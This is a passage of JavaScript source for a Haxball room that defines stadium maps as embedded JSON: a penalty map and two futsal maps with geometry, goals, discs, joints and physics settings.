			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"red",
				"blue"
			],
			"trait": "line",
			"x": 80
		},
		{
			"v0": 37,
			"v1": 38,
			"curve": 0,
			"vis": true,
			"color": "FFFFFF",
			"bCoef": 0,
			"trait": "line",
			"x": 80
		},
		{
			"v0": 39,
			"v1": 40,
			"curve": 0,
			"vis": false,
			"bCoef": 0,
			"cMask": [
				"ball"
			],
			"cGroup": [
				"wall"
			],
			"trait": "goalNet",
			"damping": 0.96,
			"strength": 0.1,
			"_length": 9
		},
		{
			"v0": 41,
			"v1": 42,
			"curve": 0,
			"vis": false,
			"bCoef": 0.1,
			"cMask": [
				"ball"
			],
			"cGroup": [
				"wall"
			],
			"trait": "goalNet"
		},
		{
			"v0": 43,
			"v1": 44,
			"curve": 0,
			"vis": false,
			"bCoef": 0.1,
			"cMask": [
				"ball"
			],
			"cGroup": [
				"wall"
			],
			"trait": "goalNet"
		},
		{
			"v0": 45,
			"v1": 46,
			"vis": true,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"v0": 45,
			"v1": 47,
			"vis": true,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"v0": 48,
			"v1": 49,
			"vis": true,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"v0": 50,
			"v1": 51,
			"vis": true,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"v0": 51,
			"v1": 52,
			"vis": true,
			"bCoef": 0,
			"trait": "line"
		},
		{
			"v0": 53,
			"v1": 54,
			"vis": true,
			"bCoef": 0,
			"trait": "line"
		}
	],
	"goals": [
		{
			"p0": [
				210,
				100
			],
			"p1": [
				210,
				-100
			],
			"team": "blue"
		},
		{
			"p0": [
				200,
				-102.533340454
			],
			"p1": [
				-1,
				-102.533340454
			],
			"team": "red",
			"trait": "goalNet"
		},
		{
			"p0": [
				-1,
				-102.533340454
			],
			"p1": [
				0,
				-23.5333404541
			],
			"team": "red",
			"trait": "goalNet"
		},
		{
			"p0": [
				-1,
				-24.5333404541
			],
			"p1": [
				-15,
				-21.5333404541
			],
			"team": "red",
			"trait": "goalNet"
		},
		{
			"p0": [
				-15,
				-21.5333404541
			],
			"p1": [
				-15,
				11.4666595459
			],
			"team": "red",
			"trait": "goalNet"
		},
		{
			"p0": [
				-15,
				11.4666595459
			],
			"p1": [
				-4,
				18.4666595459
			],
			"team": "red",
			"trait": "goalNet"
		},
		{
			"p0": [
				-3,
				18.4666595459
			],
			"p1": [
				0,
				99.4666595459
			],
			"team": "red",
			"trait": "goalNet"
		},
		{
			"p0": [
				0,
				99.4666595459
			],
			"p1": [
				200,
				101.466659546
			],
			"team": "red",
			"trait": "goalNet"
		}
	],
	"discs": [
		{
			"radius": 6,
			"pos": [
				200,
				100
			],
			"color": "FFFFFF",
			"bCoef": 0.5,
			"trait": "goalPost"
		},
		{
			"radius": 6,
			"pos": [
				200,
				-100
			],
			"color": "FFFFFF",
			"bCoef": 0.5,
			"trait": "goalPost"
		},
		{
			"radius": 3,
			"pos": [
				200.5,
				-338.5
			],
			"color": "FF9100",
			"bCoef": 0,
			"trait": "line"
		},
		{
			"radius": 3,
			"pos": [
				200,
				340
			],
			"color": "FF9100",
			"bCoef": 0,
			"trait": "line"
		},
		{
			"radius": 4,
			"pos": [
				260,
				100
			],
			"color": "FF9100",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue",
				"all"
			],
			"trait": "goalPost",
			"damping": 0.96
		},
		{
			"radius": 4,
			"pos": [
				260,
				-100
			],
			"color": "FF9100",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue",
				"all"
			],
			"trait": "goalPost",
			"damping": 0.96
		},
		{
			"radius": 4.2,
			"invMass": 2.5,
			"pos": [
				213,
				100
			],
			"color": "FFFFFF",
			"bCoef": 0.1,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				260.0266974590394,
				-86.37435392297095
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				259.9351546824686,
				-72.3769162158391
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				260.35534335547095,
				-58.37710356533961
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				260.77317912622334,
				-44.374949033149015
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				260.6886730152846,
				-28.87514740320836
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				261.09946109984605,
				-13.870662009885535
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				260.5266974590394,
				0.12564607702904595
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				260.9351546824686,
				15.123083784160897
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				260.85534335547095,
				29.62289643466039
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				261.27317912622334,
				44.12505096685098
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				260.6886730152846,
				58.62485259679164
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 1.5,
			"pos": [
				260.77317912622334,
				73.12505096685098
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4,
			"invMass": 1.5,
			"pos": [
				260.1886730152846,
				87.12485259679164
			],
			"color": "FFFFFF",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 2.5,
			"pos": [
				249,
				100
			],
			"color": "FFFFFF",
			"bCoef": 0.1,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 2.5,
			"pos": [
				237,
				100
			],
			"color": "FFFFFF",
			"bCoef": 0.1,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 2.5,
			"pos": [
				225,
				100
			],
			"color": "FFFFFF",
			"bCoef": 0.1,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 2.5,
			"pos": [
				249,
				-100
			],
			"color": "FFFFFF",
			"bCoef": 0.1,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 2.5,
			"pos": [
				213,
				-100
			],
			"color": "FFFFFF",
			"bCoef": 0.1,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 2.5,
			"pos": [
				225,
				-100
			],
			"color": "FFFFFF",
			"bCoef": 0.1,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4.2,
			"invMass": 2.5,
			"pos": [
				237,
				-100
			],
			"color": "FFFFFF",
			"bCoef": 0.1,
			"cMask": [
				"ball",
				"red",
				"blue"
			],
			"trait": "file",
			"damping": 0.96,
			"_length": 9,
			"strength": 0.1
		},
		{
			"radius": 4,
			"pos": [
				267,
				-105
			],
			"color": "CC7200",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue",
				"all"
			],
			"trait": "goalPost",
			"damping": 0.96
		},
		{
			"radius": 4,
			"pos": [
				274,
				-111
			],
			"color": "B06200",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue",
				"all"
			],
			"trait": "goalPost",
			"damping": 0.96
		},
		{
			"radius": 4,
			"pos": [
				281,
				-117
			],
			"color": "965400",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue",
				"all"
			],
			"trait": "goalPost",
			"damping": 0.96
		},
		{
			"radius": 4,
			"pos": [
				267,
				105
			],
			"color": "CC7200",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue",
				"all"
			],
			"trait": "goalPost",
			"damping": 0.96
		},
		{
			"radius": 4,
			"pos": [
				274,
				111
			],
			"color": "FF9100",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue",
				"all"
			],
			"trait": "goalPost",
			"damping": 0.96
		},
		{
			"radius": 4,
			"pos": [
				274,
				111
			],
			"color": "B06200",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue",
				"all"
			],
			"trait": "goalPost",
			"damping": 0.96
		},
		{
			"radius": 4,
			"pos": [
				281,
				117
			],
			"color": "965400",
			"bCoef": 0,
			"cMask": [
				"ball",
				"red",
				"blue",
				"all"
			],
			"trait": "goalPost",
			"damping": 0.96
		}
	],
	"planes": [
		{
			"normal": [
				0,
				1
			],
			"dist": -370,
			"cMask": [
				"all"
			],
			"trait": "ballArea",
			"_data": {
				"extremes": {
					"normal": [
						0,
						1
					],
					"dist": -370,
					"canvas_rect": [
						-652,
						-500,
						653,
						500
					],
					"a": [
						-652,
						-370
					],
					"b": [
						653,
						-370
					]
				}
			}
		},
		{
			"normal": [
				0,
				-1
			],
			"dist": -370,
			"cMask": [
				"all"
			],
			"trait": "ballArea",
			"_data": {
				"extremes": {
					"normal": [
						0,
						-1
					],
					"dist": -370,
					"canvas_rect": [
						-652,
						-500,
						653,
						500
					],
					"a": [
						-652,
						370
					],
					"b": [
						653,
						370
					]
				}
			}
		},
		{
			"normal": [
				0,
				1
			],
			"dist": -406,
			"bCoef": 0.1,
			"_data": {
				"extremes": {
					"normal": [
						0,
						1
					],
					"dist": -406,
					"canvas_rect": [
						-652,
						-500,
						653,
						500
					],
					"a": [
						-652,
						-406
					],
					"b": [
						653,
						-406
					]
				}
			}
		},
		{
			"normal": [
				0,
				-1
			],
			"dist": -409,
			"bCoef": 0.1,
			"_data": {
				"extremes": {
					"normal": [
						0,
						-1
					],
					"dist": -409,
					"canvas_rect": [
						-652,
						-500,
						653,
						500
					],
					"a": [
						-652,
						409
					],
					"b": [
						653,
						409
					]
				}
			}
		},
		{
			"normal": [
				1,
				0
			],
			"dist": -223,
			"bCoef": 0.1,
			"cMask": [
				"all"
			],
			"_data": {
				"extremes": {
					"normal": [
						1,
						0
					],
					"dist": -223,
					"canvas_rect": [
						-652,
						-500,
						653,
						500
					],
					"a": [
						-223,
						-500
					],
					"b": [
						-223,
						500
					]
				}
			}
		},
		{
			"normal": [
				-1,
				0
			],
			"dist": -266.3472,
			"bCoef": 0.1,
			"vis": true,
			"invMass": 1,
			"_selected": true,
			"_data": {
				"extremes": {
					"normal": [
						-1,
						0
					],
					"dist": -266.3472,
					"canvas_rect": [
						-652,
						-500,
						653,
						500
					],
					"a": [
						266.3472,
						-500
					],
					"b": [
						266.3472,
						500
					]
				}
			}
		}
	],
	"traits": {
		"ballArea": {
			"vis": false,
			"bCoef": 1,
			"cMask": [
				"ball"
			]
		},
		"goalPost": {
			"radius": 8,
			"invMass": 0,
			"bCoef": 0.5
		},
		"goalNet": {
			"vis": true,
			"bCoef": 0.1,
			"cMask": [
				"all"
			]
		},
		"kickOffBarrier": {
			"vis": false,
			"bCoef": 0.1,
			"cGroup": [
				"redKO",
				"blueKO"
			],
			"cMask": [
				"red",
				"blue"
			]
		},
		"line": {
			"vis": true,
			"bCoef": 0,
			"cMask": [
				""
			]
		},
		"file": {
			"vis": true
		}
	},
	"playerPhysics": {
		"acceleration": 0.12,
		"kickingAcceleration": 0.083,
		"kickStrength": 4,
		"bCoef": 0
	},
	"ballPhysics": {
		"radius": 7.4,
		"color": "FF9100",
		"bCoef": 0.4,
		"invMass": 1.5,
		"damping": 1
	},
	"joints": [
		{
			"d0": 1,
			"d1": 7,
			"strength": "rigid",
			"color": "FFFFFF",
			"length": null
		},
		{
			"d0": 7,
			"d1": 23,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"bCoef": 0.1,
			"invMass": 2.5
		},
		{
			"d0": 22,
			"d1": 23,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"bCoef": 0.1,
			"invMass": 2.5
		},
		{
			"d0": 21,
			"d1": 22,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"bCoef": 0.1,
			"invMass": 2.5
		},
		{
			"d0": 5,
			"d1": 21,
			"strength": "rigid",
			"color": "FFFFFF",
			"length": null
		},
		{
			"d0": 5,
			"d1": 20,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"damping": 0.96,
			"bCoef": 0
		},
		{
			"d0": 19,
			"d1": 20,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 18,
			"d1": 19,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 17,
			"d1": 18,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 16,
			"d1": 17,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 15,
			"d1": 16,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 14,
			"d1": 15,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 13,
			"d1": 14,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 12,
			"d1": 13,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 11,
			"d1": 12,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 10,
			"d1": 11,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 9,
			"d1": 10,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 8,
			"d1": 9,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"invMass": 1.5,
			"bCoef": 0,
			"damping": 0.96
		},
		{
			"d0": 6,
			"d1": 8,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"damping": 0.96,
			"bCoef": 0
		},
		{
			"d0": 6,
			"d1": 24,
			"strength": "rigid",
			"color": "FFFFFF",
			"length": null
		},
		{
			"d0": 24,
			"d1": 27,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"bCoef": 0.1,
			"invMass": 2.5
		},
		{
			"d0": 26,
			"d1": 27,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"bCoef": 0.1,
			"invMass": 2.5
		},
		{
			"d0": 25,
			"d1": 26,
			"_length": 9,
			"strength": 0.1,
			"color": "FFFFFF",
			"length": 9,
			"bCoef": 0.1,
			"invMass": 2.5
		},
		{
			"d0": 2,
			"d1": 25,
			"strength": "rigid",
			"color": "FFFFFF",
			"length": null
		}
	],
	"redSpawnPoints": [],
	"blueSpawnPoints": [],
	"canBeStored": false
}`;
RSRMap = false;
return PenaltıMap;
}

const classicMap = '{"name":"FUTSAL 2v2 | AF","width":420,"height":200,"spawnDistance":175,"bg": { "type": "", "width": 0, "height": 0, "color": "303030" },"vertexes":[{"x":-370,"y":170,"trait":"ballArea"},{"x":-370,"y":77,"trait":"ballArea"},{"x":-370,"y":-77,"trait":"ballArea"},{"x":-370,"y":-170,"trait":"ballArea"},{"x":370,"y":170,"trait":"ballArea"},{"x":370,"y":77,"trait":"ballArea"},{"x":370,"y":-77,"trait":"ballArea"},{"x":370,"y":-170,"trait":"ballArea"},{"x":0,"y":170,"trait":"kickOffBarrier"},{"x":0,"y":75,"trait":"kickOffBarrier"},{"x":0,"y":-75,"trait":"kickOffBarrier"},{"x":0,"y":-170,"trait":"kickOffBarrier"},{"x":-380,"y":-77,"trait":"goalNet"},{"x":-400,"y":-57,"trait":"goalNet"},{"x":-400,"y":57,"trait":"goalNet"},{"x":-380,"y":77,"trait":"goalNet"},{"x":380,"y":-77,"trait":"goalNet"},{"x":400,"y":-57,"trait":"goalNet"},{"x":400,"y":57,"trait":"goalNet"},{"x":380,"y":77,"trait":"goalNet"},{"x":0,"y":170,"trait":"kickOffBarrier"},{"x":0,"y":200,"trait":"kickOffBarrier"},{"x":0,"y":-200,"trait":"kickOffBarrier"},{"x":0,"y":-170,"trait":"kickOffBarrier"},{"trait":"line","x":-370,"y":-170},{"trait":"line","x":370,"y":-170},{"trait":"line","x":370,"y":170},{"trait":"line","x":-370,"y":170},{"trait":"line","x":-370,"y":-77},{"trait":"line","x":-370,"y":77},{"trait":"line","x":370,"y":-77},{"trait":"line","x":370,"y":77},{"trait":"line","x":-360,"y":-170},{"trait":"line","x":-370,"y":-160},{"trait":"line","x":-370,"y":160},{"trait":"line","x":-360,"y":170},{"trait":"line","x":360,"y":170},{"trait":"line","x":370,"y":160},{"trait":"line","x":370,"y":-160},{"trait":"line","x":360,"y":-170},{"x":0,"y":-3,"trait":"line"},{"x":0,"y":3,"trait":"line"},{"x":-175,"y":-3,"trait":"line"},{"x":-175,"y":3,"trait":"line"},{"x":-175,"y":-77,"trait":"line"},{"trait":"line","x":-175,"y":-71},{"trait":"line","x":-175,"y":77},{"trait":"line","x":-175,"y":71},{"trait":"line","x":175,"y":-3},{"trait":"line","x":175,"y":3},{"trait":"line","x":175,"y":-77},{"trait":"line","x":175,"y":-71},{"trait":"line","x":175,"y":77},{"trait":"line","x":175,"y":71},{"trait":"line","x":-370,"y":-140},{"trait":"line","x":-290,"y":-77},{"trait":"line","x":-290,"y":77},{"trait":"line","x":-370,"y":140},{"trait":"line","x":370,"y":-140},{"trait":"line","x":290,"y":-77},{"trait":"line","x":290,"y":77},{"trait":"line","x":370,"y":140},{"trait":"line","x":-285,"y":-3},{"trait":"line","x":-285,"y":3},{"trait":"line","x":285,"y":-3},{"trait":"line","x":285,"y":3},{"x":-377,"y":-77,"trait":"ballArea"},{"x":-377,"y":-170,"trait":"ballArea"},{"x":-377,"y":170,"trait":"ballArea"},{"x":-377,"y":77,"trait":"ballArea"},{"x":377,"y":170,"trait":"ballArea"},{"x":377,"y":77,"trait":"ballArea"},{"x":377,"y":-77,"trait":"ballArea"},{"x":377,"y":-170,"trait":"ballArea"},{"x":-385,"y":-77,"trait":"ballArea"},{"x":-385,"y":-170,"trait":"ballArea"},{"x":-385,"y":170,"trait":"ballArea"},{"x":-385,"y":77,"trait":"ballArea"},{"x":385,"y":170,"trait":"ballArea"},{"x":385,"y":77,"trait":"ballArea"},{"x":385,"y":-77,"trait":"ballArea"},{"x":385,"y":-170,"trait":"ballArea"}],"segments":[{"v0":0,"v1":1,"trait":"ballArea","vis":true,"color":"FFFFFF"},{"v0":2,"v1":3,"trait":"ballArea","vis":true,"color":"FFFFFF"},{"v0":4,"v1":5,"trait":"ballArea","vis":true,"color":"FFFFFF"},{"v0":6,"v1":7,"trait":"ballArea","vis":true,"color":"FFFFFF"},{"v0":12,"v1":13,"trait":"goalNet","curve":-90},{"v0":13,"v1":14,"trait":"goalNet"},{"v0":14,"v1":15,"trait":"goalNet","curve":-90},{"v0":16,"v1":17,"trait":"goalNet","curve":90},{"v0":17,"v1":18,"trait":"goalNet"},{"v0":18,"v1":19,"trait":"goalNet","curve":90},{"v0":8,"v1":9,"trait":"kickOffBarrier"},{"v0":9,"v1":10,"trait":"kickOffBarrier","curve":180,"cGroup":["blueKO"]},{"v0":9,"v1":10,"trait":"kickOffBarrier","curve":-180,"cGroup":["redKO"]},{"v0":10,"v1":11,"trait":"kickOffBarrier"},{"v0":20,"v1":21,"trait":"kickOffBarrier","vis":false},{"v0":22,"v1":23,"trait":"kickOffBarrier","vis":false},{"v0":24,"v1":25,"trait":"line"},{"v0":26,"v1":27,"trait":"line"},{"v0":28,"v1":29,"trait":"line"},{"v0":30,"v1":31,"trait":"line"},{"curve":90,"trait":"line","v0":32,"v1":33},{"curve":90,"trait":"line","v0":34,"v1":35},{"curve":90,"trait":"line","v0":36,"v1":37},{"curve":90,"trait":"line","v0":38,"v1":39},{"trait":"line","v0":40,"v1":41},{"trait":"line","v0":40,"v1":41,"curve":-90},{"trait":"line","v0":40,"v1":41,"curve":90},{"trait":"line","v0":40,"v1":41,"curve":-180},{"trait":"line","v0":40,"v1":41,"curve":180},{"trait":"line","v0":42,"v1":43},{"trait":"line","v0":42,"v1":43,"curve":-90},{"trait":"line","v0":42,"v1":43,"curve":90},{"trait":"line","v0":42,"v1":43,"curve":-180},{"trait":"line","v0":42,"v1":43,"curve":180},{"trait":"line","v0":44,"v1":45},{"trait":"line","v0":44,"v1":45,"curve":-90},{"trait":"line","v0":44,"v1":45,"curve":90},{"trait":"line","v0":44,"v1":45,"curve":-180},{"trait":"line","v0":44,"v1":45,"curve":180},{"trait":"line","v0":46,"v1":47},{"trait":"line","v0":46,"v1":47,"curve":-90},{"trait":"line","v0":46,"v1":47,"curve":90},{"trait":"line","v0":46,"v1":47,"curve":-180},{"trait":"line","v0":46,"v1":47,"curve":180},{"trait":"line","v0":48,"v1":49},{"trait":"line","v0":48,"v1":49,"curve":-90},{"trait":"line","v0":48,"v1":49,"curve":90},{"trait":"line","v0":48,"v1":49,"curve":-180},{"trait":"line","v0":48,"v1":49,"curve":180},{"trait":"line","v0":50,"v1":51},{"trait":"line","v0":50,"v1":51,"curve":-90},{"trait":"line","v0":50,"v1":51,"curve":90},{"trait":"line","v0":50,"v1":51,"curve":-180},{"trait":"line","v0":50,"v1":51,"curve":180},{"trait":"line","v0":52,"v1":53},{"trait":"line","v0":52,"v1":53,"curve":-90},{"trait":"line","v0":52,"v1":53,"curve":90},{"trait":"line","v0":52,"v1":53,"curve":-180},{"trait":"line","v0":52,"v1":53,"curve":180},{"trait":"line","v0":54,"v1":55,"curve":85},{"trait":"line","v0":55,"v1":56,"curve":15},{"trait":"line","v0":56,"v1":57,"curve":85},{"trait":"line","v0":58,"v1":59,"curve":-85},{"trait":"line","v0":59,"v1":60,"curve":-15},{"trait":"line","v0":60,"v1":61,"curve":-85},{"trait":"line","v0":62,"v1":63},{"trait":"line","v0":62,"v1":63,"curve":-90},{"trait":"line","v0":62,"v1":63,"curve":90},{"trait":"line","v0":62,"v1":63,"curve":-180},{"trait":"line","v0":62,"v1":63,"curve":180},{"trait":"line","v0":64,"v1":65},{"trait":"line","v0":64,"v1":65,"curve":-90},{"trait":"line","v0":64,"v1":65,"curve":90},{"trait":"line","v0":64,"v1":65,"curve":-180},{"trait":"line","v0":64,"v1":65,"curve":180},{"v0":66,"v1":67,"trait":"ballArea"},{"v0":68,"v1":69,"trait":"ballArea"},{"v0":70,"v1":71,"trait":"ballArea"},{"v0":72,"v1":73,"trait":"ballArea"},{"v0":74,"v1":75,"trait":"ballArea"},{"v0":76,"v1":77,"trait":"ballArea"},{"v0":78,"v1":79,"trait":"ballArea"},{"v0":80,"v1":81,"trait":"ballArea"}],"goals":[{"p0":[-380,77],"p1":[-380,-77],"team":"red"},{"p0":[380,77],"p1":[380,-77],"team":"blue"}],"discs":[{"pos":[-370,77],"trait":"goalPost"},{"pos":[-370,-77],"trait":"goalPost"},{"pos":[370,77],"trait":"goalPost"},{"pos":[370,-77],"trait":"goalPost"}],"planes":[{"normal":[0,1],"dist":-170,"trait":"ballArea"},{"normal":[0,-1],"dist":-170,"trait":"ballArea"},{"normal":[0,1],"dist":-200,"bCoef":0.1},{"normal":[0,-1],"dist":-200,"bCoef":0.1},{"normal":[1,0],"dist":-420,"bCoef":0.1},{"normal":[-1,0],"dist":-420,"bCoef":0.1}],"traits":{"line":{"cMask":[""],"color":"FFFFFF"},"ballArea":{"vis":false,"bCoef":1,"cMask":["ball"]},"goalPost":{"radius":8,"invMass":0,"bCoef":0.5,"color":"E50808"},"goalNet":{"bCoef":-1,"cMask":["ball"]},"kickOffBarrier":{"bCoef":-1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"],"color":"FFFFFF"}},"playerPhysics":{"bCoef":0.15,"invMass":0.3,"kickStrength":6.15},"ballPhysics":{"radius":8.8,"bCoef":0.4,"color":"FFFF00"}}';

const bigMap = '{"name":"Futsal 4v4 | AF","width":755,"height":339,"spawnDistance":310,"bg": { "type": "", "width": 0, "height": 0, "color": "303030" },"vertexes":[{"x":-665,"y":290,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-665,"y":80,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-665,"y":-80,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-665,"y":-290,"trait":"ballArea","bCoef":1,"cMask":["ball"]},{"x":665,"y":290,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":665,"y":80,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":665,"y":-80,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":665,"y":-290,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":0,"y":306,"trait":"kickOffBarrier"},{"x":0,"y":80,"trait":"kickOffBarrier"},{"x":0,"y":-80,"trait":"line"},{"x":0,"y":-306,"trait":"kickOffBarrier"},{"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","x":-693,"y":-80},{"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","x":693,"y":-80},{"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","x":-693,"y":80},{"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","x":693,"y":80},{"trait":"line","x":-665,"y":-215},{"trait":"line","x":-500,"y":-50},{"trait":"line","x":665,"y":-215},{"trait":"line","x":500,"y":-50},{"trait":"line","x":-665,"y":215},{"trait":"line","x":-500,"y":50},{"trait":"line","x":665,"y":215},{"trait":"line","x":500,"y":50},{"bCoef":1,"trait":"ballArea","x":665,"y":290},{"bCoef":1,"trait":"ballArea","x":665,"y":-290},{"bCoef":0,"trait":"line","x":0,"y":290},{"bCoef":0,"trait":"line","x":0,"y":-290},{"x":0,"y":80,"trait":"kickOffBarrier"},{"x":0,"y":-80,"trait":"kickOffBarrier"},{"x":674,"y":-80,"trait":"line","cMask":["ball"],"bCoef":1},{"x":674,"y":-290,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-674,"y":-80,"trait":"line","cMask":["ball"],"bCoef":1},{"x":-674,"y":-290,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-674,"y":80,"trai